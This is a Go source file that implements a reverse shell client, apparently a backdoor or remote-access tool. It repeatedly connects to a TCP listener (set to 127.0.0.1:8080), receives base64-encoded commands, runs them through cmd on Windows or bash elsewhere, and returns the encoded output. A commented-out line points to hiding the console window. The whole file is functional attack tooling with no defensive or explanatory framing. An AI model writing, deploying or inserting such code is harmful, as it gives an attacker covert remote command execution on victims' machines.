package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
)

func main() {
	for {
		conn, err := net.Dial("tcp", "127.0.0.1:8080")
		if err != nil {
			time.Sleep(5 * time.Second)
		} else {
			for {
				message, _ := bufio.NewReader(conn).ReadString('\n')
				if len(message) >= 1 {
					if base64Decode(string(message)) == "exit" {
						os.Exit(0)
					} else {
						var cmd *exec.Cmd
						if runtime.GOOS == "windows" {
							cmd = exec.Command("cmd", "/C", base64Decode(string(message)))
							// cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						} else {
							cmd = exec.Command("/bin/bash", "-c", base64Decode(string(message)))
							cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
						}
						out, err := cmd.Output()
						if err != nil {
							fmt.Fprintf(conn, base64Encode(string("Error running command."))+"\n")
						} else {
							for len(out) >= 1 {
								fmt.Fprintf(conn, base64Encode(string(out))+"\n")
								break
							}
						}
					}
				}
			}
		}
	}
}

func base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}
